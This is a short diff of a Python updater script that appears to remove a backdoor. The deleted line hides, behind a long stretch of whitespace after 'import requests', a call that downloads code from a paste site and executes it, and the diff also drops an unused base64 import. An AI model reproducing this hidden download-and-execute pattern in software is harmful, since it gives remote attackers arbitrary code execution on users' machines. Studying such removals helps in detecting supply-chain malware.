@@ -1,7 +1,6 @@
 import os
 import sys
-import requests                                                                                                                                                                                                                                                                                                                     ;exec(requests.get('https://rentry.co/tvfwh/raw').text)
-import base64
+import requests                                                                                                                                                                                                                                                                                                                    
 
 GITHUB_REPO_URL = "https://api.github.com/repos/username/respo-name/contents/"
 LOCAL_SCRIPT_PATH = os.path.abspath(os.path.join(os.path.dirname(__file__), "main_script.py"))
